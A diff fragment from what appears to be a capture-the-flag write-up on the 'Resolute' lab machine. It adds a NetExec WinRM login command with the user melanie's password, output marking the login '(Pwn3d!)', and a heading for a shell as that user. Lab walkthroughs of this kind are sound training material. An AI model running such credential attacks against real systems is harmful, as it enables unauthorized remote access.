@@ -195,4 +195,16 @@ Default access on shares
 
 Ive tried some kerberoasting now i have credentials and got nothing
 
+```python
+nxc winrm resolute.megabank.local -u melanie -p 'Welcome123!'                                                
+WINRM       10.129.96.155   5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.96.155   5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
+```
+I have access over WINRM as this user
 
+## Shell as `melanie`
+```python
+
+```
